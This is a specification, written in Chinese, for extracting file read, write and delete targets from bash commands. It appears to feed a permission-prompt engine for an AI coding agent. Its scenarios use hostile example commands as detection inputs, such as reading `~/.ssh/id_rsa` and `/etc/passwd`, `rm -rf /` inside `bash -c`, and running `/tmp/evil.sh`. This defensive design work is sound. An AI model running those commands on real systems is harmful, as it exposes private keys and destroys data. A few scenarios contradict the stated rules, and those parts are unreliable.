# bash-target-extraction Specification

## Purpose
定义 bash 命令的文件目标路径提取契约——用正则从 bash 命令文本中可靠提取需要访问的文件路径，并明确"无法解析"的边界，交由决策引擎走"未配置路径"兜底弹窗。

## Requirements

### Requirement: 支持的文件写入 / 删除命令

系统 SHALL 从以下命令中提取文件目标路径（作为"写目标"）：

- `rm`（含 `-r`, `-rf`, `-f`, `--recursive` 变体）——写目标
- `mv`（第二参数）——写目标
- `cp`（第二参数）——写目标
- `tee`（含 `-a` 追加）——写目标
- `install`——写目标
- `ln -s`（第二参数）——写目标
- `chmod` / `chown`——写目标（元数据写）
- `truncate`——写目标
- `dd of=`——写目标（value 参数）

#### Scenario: `rm -rf` 提取路径

- **WHEN** bash 命令为 `rm -rf /tmp/build`
- **THEN** 提取写目标 `/tmp/build`

#### Scenario: `mv` 提取目标路径

- **WHEN** bash 命令为 `mv /tmp/a.txt /dest/b.txt`
- **THEN** 提取写目标 `/dest/b.txt`

### Requirement: 支持的文件读取命令

系统 SHALL 从以下命令中提取文件目标路径（作为"读目标"）：

- `cat`——读目标
- `head` / `tail`——读目标
- `wc`——读目标
- `grep`——读目标（文件参数）
- `cp` / `mv`（第一参数）——读目标

#### Scenario: `cat` 提取路径

- **WHEN** bash 命令为 `cat /etc/passwd`
- **THEN** 提取读目标 `/etc/passwd`

### Requirement: 支持的重定向

系统 SHALL 从 `>`、`>>`、`2>`、`2>>` 提取写目标路径。

#### Scenario: 重定向提取

- **WHEN** bash 命令为 `echo foo > /tmp/out.txt`
- **THEN** 提取写目标 `/tmp/out.txt`

### Requirement: 网络工具目标提取

系统 SHALL 从 `curl -o <path>`、`curl --output <path>`、`wget -O <path>`、`wget <url> -O <path>` 中提取本地写目标路径（URL 不视为文件系统路径）。

#### Scenario: `curl -o` 提取写目标

- **WHEN** bash 命令为 `curl https://x.com/a -o /tmp/a.bin`
- **THEN** 提取写目标 `/tmp/a.bin`

### Requirement: 变量展开与展开失败

系统 SHALL 尝试展开常见 shell 变量（`$HOME`、`${HOME}`、`$PWD`、`${PWD}`）。其他变量（用户自定义 `$X`）MUST NOT 尝试展开——若命令中出现未展开的用户变量，整个命令 MUST 判定为"不可靠"，走"未配置路径"兜底弹窗。

#### Scenario: `$HOME` 展开

- **WHEN** bash 命令为 `cat $HOME/.ssh/id_rsa`，`HOME=/Users/eliot`
- **THEN** 提取读目标 `/Users/eliot/.ssh/id_rsa`

#### Scenario: 用户变量导致不可靠

- **WHEN** bash 命令为 `cat $MYSECRETS`（`MYSECRETS` 未展开）
- **THEN** 提取结果为 `{ reliable: false, rawCommand: "..." }`，触发 tier=two 兜底弹窗

### Requirement: 复杂语法导致不可靠

以下 bash 语法 MUST 触发"不可靠"标记（走兜底弹窗而非尝试解析）：

- 命令替换：`$(...)`、反引号 `` `...` ``
- 子 shell：`(...)`
- Process substitution：`<(...)`、`>(...)`
- Heredoc：`<<EOF`（**未引号定界**的 heredoc——内容会展开 `$` / 反引号；引号定界 heredoc `<<'EOF'`/`<<"EOF"` 见"引号定界 heredoc 内容处理"requirement，不触发不可靠）
- 未展开的用户变量（详见"变量展开与展开失败"节）
- 未加引号的 glob 通配符（`*`、`?`、`[`）——无法枚举 shell 会展开到哪些文件（有界 glob 例外见"有界 glob 免不可靠标记"requirement）

**引号感知**：以上所有模式 MUST 仅对**引号外且未被反斜杠转义**的字符生效。判定规则：

- 单引号 `'...'` 内的所有字符 MUST 视为字面量，不触发任何不可靠标记（bash 语义：单引号内 `\$` 也是字面 `$`）
- 双引号 `"..."` 内的字符 MUST 遵循 bash 双引号语义——`\$`、`\"`、`\\` 视为字面字符；裸 `$` 后接 `(` MUST 触发 command_substitution（bash 双引号内 `$()` 仍执行命令替换）
- 反斜杠 `\X`（引号外）MUST 使 `X` 视为字面字符（如 `\|`、`\$`、`` \` ``、`\(`、`\*`）
- 转义序列的判定 MUST 先于引号开合——`\\"` 中的 `\"` 是字面双引号，不视为引号开合

管道 `|` MUST NOT 单独作为"不可靠"标记；管道的处理见"管道按 stage 独立提取"与"转发器命令守卫"两个 requirement。

#### Scenario: 命令替换不可靠

- **WHEN** bash 命令为 `rm -rf $(cat /etc/hosts)`（引号外的 `$(`）
- **THEN** 提取结果为 `{ reliable: false, reason: "command_substitution" }`

#### Scenario: 管道命令不可靠

- **WHEN** bash 命令为 `cat /etc/passwd | grep root`（无转发器、无其他不可靠语法）
- **THEN** 提取结果为 `{ reliable: true, targets: [read /etc/passwd, ...] }`——管道不再单独触发"不可靠"；每个 stage 独立提取，完整行为见"管道按 stage 独立提取"requirement。转发器（`xargs`/`parallel`/`pforeach` 非首 stage）会判 `reliable: false, reason: "forwarding_command"`（除非满足"转发器命令守卫"requirement 的 read-only 下游豁免）

#### Scenario: 反引号不可靠

- **WHEN** bash 命令为 `rm -rf \`cat /etc/hosts\``
- **THEN** 提取结果为 `{ reliable: false }`

#### Scenario: 用户变量导致不可靠

- **WHEN** bash 命令为 `cat $MYSECRETS`（`MYSECRETS` 未展开）
- **THEN** 提取结果为 `{ reliable: false, rawCommand: "..." }`

#### Scenario: 未加引号的 glob 不可靠

- **WHEN** bash 命令为 `rm -rf /etc/*.log`
- **THEN** 提取结果为 `{ reliable: false, reason: "glob_expansion" }`

#### Scenario: 双引号内的转义字符不触发不可靠

- **WHEN** bash 命令为 `echo "x\$(cat /etc/passwd)"`
- **THEN** 提取结果为 `{ reliable: true }`；`\$` 在双引号内视为字面 `$`，不触发 command_substitution

#### Scenario: 单引号内的所有字符都是字面量

- **WHEN** bash 命令为 `echo 'literal \$(command) and `backtick`'`
- **THEN** 提取结果为 `{ reliable: true }`；单引号内 `$()` 与反引号都是字面字符

#### Scenario: 引号外的命令替换仍判不可靠

- **WHEN** bash 命令为 `echo $(cat /etc/passwd)`
- **THEN** 提取结果为 `{ reliable: false }`；引号外的 `$(` 仍是 command_substitution

#### Scenario: 转义管道字符不触发不可靠

- **WHEN** bash 命令为 `echo foo\|bar > /tmp/x`
- **THEN** 提取结果为 `{ reliable: true }`，包含写 target `/tmp/x`；`\|` 是字面管道字符

#### Scenario: 未引号定界 heredoc 不可靠

- **WHEN** bash 命令为 `cat <<EOF\nhello\nEOF`
- **THEN** 提取结果为 `{ reliable: false, reason: "heredoc" }`——未引号定界 heredoc 内容会展开 `$` / 反引号

#### Scenario: 引号定界 heredoc reliable

- **WHEN** bash 命令为 `cat <<'EOF'\nhello\nEOF`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`——引号定界 heredoc 内容视为字面数据，见"引号定界 heredoc 内容处理"requirement

### Requirement: 相对路径规范化

提取到的相对路径 MUST 相对于当前 `<projectRoot>`（或工具调用时的 cwd）解析为绝对路径后再交给决策引擎。

#### Scenario: 相对路径解析

- **WHEN** `<projectRoot> = /proj`，bash 命令为 `cat src/main.ts`
- **THEN** 提取读目标 `/proj/src/main.ts`

### Requirement: 提取结果数据结构

bash-target-extraction 模块的输出 MUST 为：

```ts
type ExtractResult =
  | { reliable: true; targets: Array<{ action: "read" | "write" | "delete"; path: string }> }
  | { reliable: false; rawCommand: string; reason?: string }
```

多个 targets 时，决策引擎 MUST 对每个 target 独立决策；任一 target 触发 prompt 则整条命令阻塞等待弹窗。

#### Scenario: 多目标命令

- **WHEN** bash 命令为 `cp /a /b && cp /c /d`（`&&` 视为命令序列）
- **THEN** 提取 4 个 targets（2 读 2 写），任一未授权即触发弹窗

#### Scenario: 不可靠命令返回 raw

- **WHEN** 命令包含 `|`
- **THEN** 返回 `{ reliable: false, rawCommand: "..." }`

### Requirement: 管道按 stage 独立提取

包含 `|`（管道）的 bash 命令 MUST 先在命令片段（由 `splitCommands` 按**命令分隔符**拆分得到）内部按顶层 `|` 拆分为多个 stage，然后对每个 stage 独立运行目标提取逻辑（重定向、命令表 extractor、变量展开），最后合并所有 stage 的 targets 数组。当合并后的结果非空且未触发转发器守卫、其他不可靠标记时，返回 `reliable: true`。

**命令分隔符**：`splitCommands` MUST 识别以下顶层字符作为命令分隔符（将整条命令拆为多个片段）：

- `;` —— 命令序列符
- `&&` —— 逻辑与
- `||` —— 逻辑或
- `&` —— 后台运行符号（除下面列举的例外）
- `\n` —— 换行符（多行粘贴命令场景）

**`&` 判定的例外**：以下位置的 `&` MUST NOT 被视为命令分隔符：

- `&>` 序列（无空格，bash 语法表示 stdout+stderr 同时重定向，如 `echo hi &> /tmp/log`）
- `N>&N` 序列（fd 复制，如 `2>&1`、`1>&2`）
- `N>&-` 序列（关闭 fd，如 `2>&-`）
- `& >` 序列（`&` 后接空格再 `>`，bash 语法表示"stderr 独立重定向到后续文件"，如 `cmd & > /tmp/log`——虽罕见但语义合法）

**顶层 `|` 的判定**（保持原有语义）MUST 满足：

- 引号内的 `|`（单引号或双引号包裹）MUST NOT 作为拆分点
- `\|`（转义的 `|`）MUST NOT 作为拆分点
- `||`（逻辑或）MUST NOT 被识别为管道（避免与逻辑连接符混淆）——由 `splitCommands` 上层识别为分隔符
- `|&`（GNU bash pipe stdin+stderr 扩展）MUST 与 `|` 同拆分行为——拆开作为两个 stage

**引号感知的分隔符判定**：以上所有分隔符判定 MUST 遵循现有引号语义——单引号 `'...'` 内的所有分隔符 MUST 视为字面量；双引号 `"..."` 内的分隔符 MUST 视为字面量（除 `$(` 等双引号内仍可触发的元字符外）；反斜杠转义的分隔符（如 `\;`、`\&`、`\n`）MUST 视为字面量。

各 stage 的 targets 合并语义：所有 stage 的 targets 全部保留，不去重、不改顺序。任一 stage 的可靠提取失败（未识别命令且无重定向且无 pipe 引用）MUST NOT 影响其他 stage——未识别命令的 stage 贡献 0 个 target，其他 stage 正常贡献。

#### Scenario: 简单管道提取两个 stage 的读 target

- **WHEN** bash 命令为 `cat /etc/passwd | grep root`
- **THEN** 提取结果为 `{ reliable: true }`，包含读 target `/etc/passwd`

#### Scenario: 过滤器流水线提取首 stage target

- **WHEN** bash 命令为 `find /etc | sort | head -5`
- **THEN** 提取结果为 `{ reliable: true }`，包含读 target `/etc`

#### Scenario: tee 在管道中仍提取写 target

- **WHEN** bash 命令为 `echo hi | tee /tmp/log.txt`
- **THEN** 提取结果为 `{ reliable: true }`，包含写 target `/tmp/log.txt`

#### Scenario: 引号内管道字符不拆分

- **WHEN** bash 命令为 `echo "a|b" > /tmp/x`
- **THEN** 提取结果为 `{ reliable: true }`，包含写 target `/tmp/x`；`a|b` 不被误当两个 stage

#### Scenario: 逻辑或逻辑与不视为管道

- **WHEN** bash 命令为 `ls /a || ls /b`
- **THEN** 提取结果为 `{ reliable: true }`，包含读 target `/a` 和读 target `/b`；命令被视为两个独立的命令片段，非管道

#### Scenario: pipe stdin+stderr 扩展视为普通管道

- **WHEN** bash 命令为 `echo err >&2 | tee /tmp/x`
- **THEN** 提取结果为 `{ reliable: true }`，包含写 target `/tmp/x`；`|&` 被拆分为两个 stage

#### Scenario: 引号感知与管道拆分协同

- **WHEN** bash 命令为 `grep -E "foo|bar" /etc/passwd`
- **THEN** 提取结果为 `{ reliable: true }`，包含读 target `/etc/passwd`；双引号内的 `|` 不拆分为两个 stage

#### Scenario: 分号分隔的多个片段

- **WHEN** bash 命令为 `ls /a; wc -l src/*.ts`，projectRoot 内
- **THEN** 提取结果为 `{ reliable: true }`，包含读 target `/a` 与读 target `<projectRoot>/src/*.ts`；命令被视为两个独立片段

#### Scenario: `&` 分隔的多个片段

- **WHEN** bash 命令为 `sleep 5 & wc -l src/*.ts`，projectRoot 内
- **THEN** 提取结果为 `{ reliable: true }`，`sleep` 片段 0 target，`wc` 片段含读 target `<projectRoot>/src/*.ts`

#### Scenario: 换行分隔的多个片段

- **WHEN** bash 命令为 `echo hi\nwc -l src/*.ts`（`\n` 为实际换行），projectRoot 内
- **THEN** 提取结果为 `{ reliable: true }`，`echo hi` 片段 0 target，`wc` 片段含读 target `<projectRoot>/src/*.ts`

#### Scenario: `&>` 不被误判为命令分隔

- **WHEN** bash 命令为 `echo hi &> /tmp/log`
- **THEN** 提取结果为 `{ reliable: true, targets: [write /tmp/log] }`——`&>` 被识别为 stdout+stderr 重定向（无空格形式），不拆分为两个片段

#### Scenario: fd-dup `N>&N` 不被误判为命令分隔

- **WHEN** bash 命令为 `cmd 2>&1`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`——`2>&1` 被识别为 fd 复制，不拆分；命令 `cmd` 未在 COMMAND_TABLE 中，0 target

#### Scenario: 关闭 fd `N>&-` 不被误判为命令分隔

- **WHEN** bash 命令为 `cmd 2>&-`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`——`2>&-` 被识别为关闭 stderr，不拆分

#### Scenario: `& >` 空格形式不被误判为命令分隔

- **WHEN** bash 命令为 `echo hi & > /tmp/log`
- **THEN** 提取结果为 `{ reliable: true, targets: [write /tmp/log] }`——`& >` 被识别为"stderr 独立重定向到后续文件"，不拆分

#### Scenario: 引号内的分隔符视为字面

- **WHEN** bash 命令为 `echo 'hi; wc -l src/*.ts'`
- **THEN** 提取结果为 `{ reliable: true, targets: [] }`——单引号内所有分隔符与 glob 均为字面量，不触发任何拆分或不可靠判定

### Requirement: 转发器命令守卫

某些命令消费 stdin 内容并将其作为参数传给下游工具（即"转发器"）。当转发器命令出现在**管道的任一 stage**（包括首 stage）时，默认判整条命令为不可靠——静态分析无法枚举下游调用参数。

**read-only 下游豁免**：当转发器 stage 满足以下全部条件时，MUST NOT 判 `forwarding_command`，改为按下游命令的 read target 提取规则处理上游输出的文件列表：

1. 转发器后的**下游命令**（转发器 token 后的第一个非 flag token）属于 READ_ONLY_COMMANDS 或满足 find 的参数条件性只读判定（见"有界 glob 免不可靠标记"requirement 中的"find 的参数条件性只读判定"节），且参数可静态判定
2. 下游命令的参数 MUST 可静态判定——不含 `$`（除循环变量白名单 `$?`/`$!`/`$#`/`$$`）、反引号、`$(...)`、未加引号的 glob 元字符、未引号定界 heredoc
3. 转发器自身的参数（如 `xargs -I {}`、`xargs -n 1`）不影响豁免判定——只看下游命令
4. **upstream 只读**：转发器 stage 之前的所有 upstream pipeline stages MUST 各自满足"命令及其参数是只读的"（判定方式同"有界 glob 免不可靠标记"条件 3）。任一 upstream stage 含写操作（如 `find -exec rm`、`find -delete`、`rm`、`tee`、重定向写等）时，MUST NOT 豁免

**首 stage 转发器**：首 stage 是转发器时（如 `xargs rm -rf`、`xargs grep pattern`），MUST 也走转发器守卫检查。首 stage 的 upstream 为空，豁免条件 4（upstream 只读）平凡满足；豁免条件 1、2、3 按下游命令判定。

**理由**：原实现对转发器的处理有两个漏洞：
1. 首 stage 是转发器时完全跳过检查（`for (let i = 1; i < stages.length; i++)`），导致 `xargs rm -rf` 静默通过
2. 只看 downstream，不看 upstream——`find . -exec rm {} \; | xargs cat` 因为下游 `cat` 只读而豁免，上游 `find -exec rm` 完全未检

豁免扫描改为"覆盖所有 stage + 同时检查 upstream"后：
- `xargs rm -rf`（首 stage，downstream rm 是 write）→ 不豁免，判 forwarding_command
- `xargs grep pattern`（首 stage，downstream grep 是 read-only）→ 豁免
- `find . -exec rm {} \; | xargs cat`（upstream `find -exec rm` 含 write）→ 不豁免，判 forwarding_command
- `find . -name "*.ts" | xargs grep pattern`（upstream `find -name` 无 write）→ 豁免

系统 MUST 定义转发器命令表，至少包含 `xargs`、`parallel`、`pforeach`。

判定条件（默认 + 豁免）：

- 命令名精确匹配（不模糊）
- 该 stage 是**任一 stage**（包括首 stage，即所有 stage 都检查）
- **豁免判定**：转发器 stage MUST 先检查 read-only 下游豁免条件（包括 upstream 只读条件）；满足豁免 → 不判不可靠，按下游命令提取 read targets；不满足豁免 → 维持 `forwarding_command`

转发器命令的 `reason` 字段 MUST 包含 `"forwarding_command"` 字样以便用户/审计识别（仅在豁免不适用时）。

#### Scenario: xargs 在管道后续 stage 判不可靠

- **WHEN** bash 命令为 `find /etc | xargs rm`
- **THEN** 提取结果为 `{ reliable: false, reason: "forwarding_command" }`——下游 `rm` 是 write 命令，不满足 read-only 下游豁免

#### Scenario: parallel 在管道后续 stage 判不可靠

- **WHEN** bash 命令为 `cat /tmp/input.txt | parallel -a /tmp/input.txt`
- **THEN** 提取结果为 `{ reliable: false, reason: "forwarding_command" }`——`parallel` 无明确 read-only 下游命令，不满足豁免

#### Scenario: xargs 无管道输入不判转发器

- **WHEN** bash 命令为 `echo hi; xargs --help`
- **THEN** 提取结果为 `{ reliable: true }`，不提取 target（`echo`、`xargs --help` 均无路径参数）——`xargs --help` 是独立命令，`--help` 是 flag，无下游命令可判 read-only，`xargs` 无下游视为满足豁免（无 write 副作用）

#### Scenario: xargs 首 stage downstream write 判不可靠

- **WHEN** bash 命令为 `xargs rm -rf`
- **THEN** 提取结果为 `{ reliable: false, reason: "forwarding_command" }`——首 stage 是转发器，downstream `rm` 是 write，不满足 read-only 下游豁免

#### Scenario: xargs 首 stage downstream read-only reliable

- **WHEN** bash 命令为 `xargs grep pattern < files.txt`
- **THEN** 提取结果为 `{ reliable: true, targets: [read files.txt] }`——首 stage 是转发器，downstream `grep` 是 read-only，upstream 为空平凡满足

#### Scenario: xargs grep read-only 下游 reliable

- **WHEN** bash 命令为 `find /tmp -name "*.log" | xargs grep "error"`
- **THEN** 提取结果为 `{ reliable: true }`——下游 `grep` 属于 READ_ONLY_COMMANDS 且参数可静态判定，upstream `find -name` 无写操作 flag，满足 read-only 下游豁免

#### Scenario: xargs wc read-only 下游 reliable

- **WHEN** bash 命令为 `find /tmp | xargs wc -l`
- **THEN** 提取结果为 `{ reliable: true }`——下游 `wc` 属于 READ_ONLY_COMMANDS

#### Scenario: xargs 下游含 `$` 仍 unreliable

- **WHEN** bash 命令为 `find /tmp | xargs grep $PATTERN`
- **THEN** 提取结果为 `{ reliable: false, reason: "forwarding_command" }`——下游参数含 `$PATTERN`，不满足可静态判定条件

#### Scenario: xargs 下游含未引号 glob 仍 unreliable

- **WHEN** bash 命令为 `find /tmp | xargs grep *.log`
- **THEN** 提取结果为 `{ reliable: false, reason: "forwarding_command" }`——下游参数含未加引号的 glob

#### Scenario: upstream `find -exec rm` + downstream read-only 判不可靠

- **WHEN** bash 命令为 `find . -exec rm {} \; | xargs cat`
- **THEN** 提取结果为 `{ reliable: false, reason: "forwarding_command" }`——upstream `find -exec rm` 含 `-exec` 写操作 flag，豁免条件 4 不满足

#### Scenario: upstream `find -delete` + downstream read-only 判不可靠

- **WHEN** bash 命令为 `find . -delete | xargs cat`
- **THEN** 提取结果为 `{ reliable: false, reason: "forwarding_command" }`——upstream `find -delete` 含 `-delete` 写操作 flag

#### Scenario: upstream `find -name` + downstream read-only reliable

- **WHEN** bash 命令为 `find . -name "*.ts" | xargs grep pattern`
- **THEN** 提取结果为 `{ reliable: true }`——upstream `find -name` 无写操作 flag，downstream `grep` read-only，满足豁免

#### Scenario: forwarder 链中每 stage 独立判定

- **WHEN** bash 命令为 `xargs cat | xargs grep pattern`
- **THEN** 提取结果为 `{ reliable: true }`——两个 stage 都是转发器，各自 downstream 都是 read-only，各自 upstream 也满足（首 stage 无 upstream，第二 stage 的 upstream 是首 stage 的 xargs，其 downstream 是 read-only）

#### Scenario: forwarder 链中含 write 上游判不可靠

- **WHEN** bash 命令为 `xargs rm -rf | xargs cat`
- **THEN** 提取结果为 `{ reliable: false, reason: "forwarding_command" }`——第一 stage 是 forwarder 且 downstream `rm` 是 write，判不可靠

### Requirement: 静默命令白名单

系统 MUST 定义 `SILENT_COMMANDS` 白名单，至少包含以下开发工具命令：`git`、`npm`、`npx`、`yarn`、`pnpm`、`make`、`tsc`、`go`、`cargo`、`openspec`、`rg`、`jq`、`tree`、`du`、`df`、`file`、`less`、`more`。

命中白名单的命令 MUST 被视为 0-target 静默——即使后面跟管道、跟路径参数或跟参数不提取。这属于**已知风险**：这些命令的 git/npm/go 子命令（如 `git rm`、`npm install`、`go build`）可能有文件系统副作用，但副作用被约束在项目 worktree 内，属于决策引擎 `project-inner` 默认允许范围。

**语义约束**：

- `SILENT_COMMANDS` 与 `COMMAND_TABLE` MUST 正交且互斥——`COMMAND_TABLE` 优先；命中 `COMMAND_TABLE` 的命令不进 SILENT 分支
- 命中 `SILENT_COMMANDS` 的命令 MUST NOT 遮盖 FORWARDING_COMMANDS 守卫——若同一命令片段中 xargs/parallel/pforeach 出现在非首 stage，仍判不可靠
- SILENT 白名单 MUST NOT 覆盖危险命令（如 `rm`、`chmod`、`chown`、`dd`）——这些命令仍在 `COMMAND_TABLE` 中正常提取 target

#### Scenario: git log 静默

- **WHEN** bash 命令为 `git log --oneline -n 10`
- **THEN** 提取结果为 `{ reliable: true }`，`targets` 为空数组；命令静默通过

#### Scenario: npm test 静默

- **WHEN** bash 命令为 `npm test`
- **THEN** 提取结果为 `{ reliable: true }`，`targets` 为空数组；命令静默通过

#### Scenario: openspec status 静默

- **WHEN** bash 命令为 `openspec status --change foo --json`
- **THEN** 提取结果为 `{ reliable: true }`，`targets` 为空数组

#### Scenario: git 在 SILENT 但 xargs 守卫仍生效

- **WHEN** bash 命令为 `git ls-files | xargs rm`
- **THEN** 提取结果为 `{ reliable: false, reason: "forwarding_command" }`；`xargs` 触发转发器守卫，即使 `git` 在 SILENT 白名单中也不遮盖

#### Scenario: rm 不在 SILENT，仍提取 write target

- **WHEN** bash 命令为 `rm -rf /tmp/build`
- **THEN** 提取结果为 `{ reliable: true }`，包含 delete target `/tmp/build`；`rm` 在 `COMMAND_TABLE` 中正常提取，不进入 SILENT 分支

### Requirement: 命令替换在引号内的处理

系统 MUST 区分引号外的命令替换（触发不可靠）与引号内的字面 `$`（不触发）。规则：

- 双引号内的 `$(` MUST 仍触发 command_substitution（bash 双引号内 `$()` 仍执行命令替换）
- 双引号内的 `\$(` MUST 视为字面 `$`，不触发
- 单引号内的所有字符（包括 `$(`、反引号、`\$`）MUST 视为字面量
- 引号外的 `$(` 与反引号 MUST 触发 command_substitution

#### Scenario: 双引号内裸命令替换仍判不可靠

- **WHEN** bash 命令为 `echo "$(cat /etc/passwd)"`
- **THEN** 提取结果为 `{ reliable: false }`；双引号内 `$()` 仍是命令替换

#### Scenario: 双引号内转义命令替换判可靠

- **WHEN** bash 命令为 `echo "\$(cat /etc/passwd)"`
- **THEN** 提取结果为 `{ reliable: true }`；`\$` 是字面 `$`，不触发命令替换

#### Scenario: 单引号内所有字符判可靠

- **WHEN** bash 命令为 `echo '$(cat /etc/passwd)'`
- **THEN** 提取结果为 `{ reliable: true }`；单引号内 `$()` 是字面字符

### Requirement: 控制流关键字守卫

以下 bash 控制流关键字作为**引号外独立 token**出现时 MUST 触发"不可靠"标记，整条命令走 tier=two 弹窗而非尝试解析：

- `while`、`do`、`done`
- `until`
- `if`、`then`、`else`、`elif`、`fi`
- `case`、`in`、`esac`

**`for` 的字面量迭代豁免**：`for` 关键字作为独立 token 出现时，若满足"字面量 for 循环豁免"requirement 的条件（字面量迭代集 + read-only 循环体），MUST NOT 触发 `control_flow`；不满足豁免条件时，`for` 仍触发 `control_flow`。详见"字面量 for 循环豁免"requirement。

**理由**：控制流关键字使得命令的实际执行取决于运行时条件或循环变量，静态分析无法预测循环体内变量的取值，也无法预测 `if`/`case` 分支的实际路径。这与管道转发器同类问题（"实际访问的文件集无法静态确定"），处理策略一致。`for` 的豁免是例外——当迭代集与循环体都可静态判定时，实际访问集是确定的，不适用"不可静态确定"的判定。

**引号感知**：控制流关键字判定 MUST 遵循引号语义——

- 单引号 `'...'` 内的关键字 MUST 视为字面量，不触发
- 双引号 `"..."` 内的关键字 MUST 视为字面量，不触发
- 引号外的关键字 MUST 作为独立 token（前后为空白或命令分隔符）时才触发；作为更长 token 的一部分（如变量名 `whileFoo`、路径 `/tmp/if.txt`）MUST NOT 触发

**检测位置**：控制流检查 MUST 在 pipeline 拆分**之前**执行——一旦检测到控制流（且不满足豁免），整条命令判不可靠，无需再拆分 stage。

#### Scenario: while 关键字判不可靠

- **WHEN** bash 命令为 `while read x; do cat $x; done`
- **THEN** 提取结果为 `{ reliable: false, reason: "control_flow" }`

#### Scenario: for 关键字判不可靠

- **WHEN** bash 命令为 `for f in $FILES; do cat $f; done`（迭代集含变量）
- **THEN** 提取结果为 `{ reliable: false, reason: "control_flow" }`——迭代集含 `$FILES`，不满足字面量迭代豁免条件，`for` 仍触发 control_flow

#### Scenario: until 关键字判不可靠

- **WHEN** bash 命令为 `until ls /; do echo hi; done`
- **THEN** 提取结果为 `{ reliable: false, reason: "control_flow" }`

#### Scenario: case 关键字判不可靠

- **WHEN** bash 命令为 `case "$x" in a) cat a;; b) cat b;; esac`
- **THEN** 提取结果为 `{ reliable: false, reason: "control_flow" }`

#### Scenario: if 关键字判不可靠

- **WHEN** bash 命令为 `if true; then cat /etc/passwd; fi`
- **THEN** 提取结果为 `{ reliable: false, reason: "control_flow" }`

#### Scenario: 控制流关键字在引号内视为字面

- **WHEN** bash 命令为 `echo "while" && cat /etc/passwd`（`while` 在双引号内）
- **THEN** 提取结果为 `{ reliable: true, targets: [read /etc/passwd] }`——引号内关键字不触发；命令按 stage 正常提取

#### Scenario: 控制流关键字作为 token 子串不触发

- **WHEN** bash 命令为 `cat /tmp/if.txt`（`if` 是文件名的一部分）
- **THEN** 提取结果为 `{ reliable: true, targets: [read /tmp/if.txt] }`——`if` 不作为独立 token 出现，不触发

#### Scenario: 字面量 for 循环 reliable（豁免）

- **WHEN** bash 命令为 `for f in a b c; do grep "$f"; done`
- **THEN** 提取结果为 `{ reliable: true, targets: [read a, read b, read c] }`——满足字面量迭代豁免，不触发 control_flow；详见"字面量 for 循环豁免"requirement

### Requirement: Shell 转发器守卫

当 bash 命令的任一 fragment / pipeline stage 以 shell 转发器（`bash`、`sh`、`dash`、`zsh`）开头，且其后出现 `-c` 标志**或任何非 flag 位置参数（脚本路径）**时，MUST 触发"不可靠"标记；`source <path>` / `. <path>`（dot-source）MUST 同样触发。

**检测规则**：

- 先用 `splitCommands` 拆 compound command（`&&`/`||`/`;`/`&`/换行），每个 fragment 再用 `splitPipelines` 拆 pipeline stage；**任一 stage 命中即触发**（不限首个 stage）
- stage 开头允许 `env` / `command` 包装器：跳过其自有 flag、flag 值（`command -v/-V NAME` 的 NAME 是查询目标；`env -u/-C/-P/-S/-I VALUE` 的 VALUE 非命令）与 `KEY=VAL` 赋值后，继续检查实际命令
- shell 名（`bash`/`sh`/`dash`/`zsh`）之后的判定：
  - `-c`（独立 token）或短选项簇含 `c`（`-xc`、`-lc`、`-xec`）→ 触发
  - **任何非 flag 位置参数**（脚本路径：`bash /tmp/x.sh`、`bash -x /tmp/x.sh`）→ 触发
  - 长 flag（`--version`）→ 停止扫描，不触发
  - 只有 flag、无位置参数（`bash -x`、`bash -h`、无参数的 `bash`）→ 不触发
- `source` / `.` 后跟任何位置参数 → 触发；无位置参数（`source` 单独、`printf .`）→ 不触发

**理由**：shell 转发器把字符串内的命令作为参数执行，字符串内容中的文件系统访问不被当前 tokenize/extract 流程识别（字符串里的 `rm -rf /` 不会被当成 target）。脚本路径（`bash /tmp/x.sh`）与 dot-source 执行的文件内容同样无法被 tokenize/extract 静态展开——脚本文件路径可静态分析，但**文件内容**不可，因此与 `-c` 同类。这是"实际访问的文件集无法静态确定"的另一类形态，与管道转发器同类。

**反例（不触发）**：

- `bash --version` / `bash -h` / `bash -x`：只有 flag 无位置参数，不执行任何脚本内容
- `echo bash` / `which bash`：`bash` 是普通参数，stage 第一个 token 不是 shell 名
- `source`（无参数）：没有要执行的脚本

#### Scenario: bash -c 判不可靠

- **WHEN** bash 命令为 `bash -c "rm -rf /"`
- **THEN** 提取结果为 `{ reliable: false, reason: "shell_forwarder" }`

#### Scenario: sh -c 判不可靠

- **WHEN** bash 命令为 `sh -c "cat /etc/passwd"`
- **THEN** 提取结果为 `{ reliable: false, reason: "shell_forwarder" }`

#### Scenario: zsh -c 判不可靠

- **WHEN** bash 命令为 `zsh -c "ls /etc"`
- **THEN** 提取结果为 `{ reliable: false, reason: "shell_forwarder" }`

#### Scenario: bash 脚本路径判不可靠

- **WHEN** bash 命令为 `bash /tmp/x.sh`（bash 后跟路径参数，非 `-c`）
- **THEN** 提取结果为 `{ reliable: false, reason: "shell_forwarder" }`——非 flag 位置参数是脚本路径，脚本文件内容无法被 tokenize/extract 静态展开，与 `-c` 同类

#### Scenario: source / dot-source 判不可靠

- **WHEN** bash 命令为 `source /tmp/x.sh` 或 `. /tmp/x.sh`
- **THEN** 提取结果为 `{ reliable: false, reason: "shell_forwarder" }`——dot-source 执行脚本文件内容，静态不可展开；`source` 无参数时不触发

#### Scenario: env 包装脚本路径判不可靠

- **WHEN** bash 命令为 `env FOO=1 bash /tmp/evil.sh` 或 `env FOO=1 source /tmp/x.sh`
- **THEN** 提取结果为 `{ reliable: false, reason: "shell_forwarder" }`——env 包装器的 `KEY=VAL` 赋值被跳过后，实际命令仍是带脚本路径的转发器

#### Scenario: env bash -c 判不可靠

- **WHEN** bash 命令为 `env PATH=/usr/bin bash -c "cat /etc/passwd"`（env 后接 bash -c）
- **THEN** 提取结果为 `{ reliable: false, reason: "shell_forwarder" }`——env 是环境修饰符，bash -c 仍是实际执行的转发器

#### Scenario: bash -c 嵌套控制流判不可靠

- **WHEN** bash 命令为 `bash -c "for f in /etc/*; do cat $f; done"`
- **THEN** 提取结果为 `{ reliable: false, reason: "shell_forwarder" }`——`bash -c` 作为 token 命中 shell 转发器守卫；而引号内的 `for`/`do` 关键字不被控制流检查命中（因为它们在双引号内是字面量）

### Requirement: Shell 内置变量白名单

以下 shell 内置变量（无路径影响的纯数字 / 标量值）MUST 视为已解析，MUST NOT 被标记为 `unresolved variable: special:*`：

- `$?` —— 上一条命令的 exit status（值域 0-255）
- `$!` —— 最后一个后台进程的 PID（纯数字）
- `$#` —— 位置参数个数（纯数字）
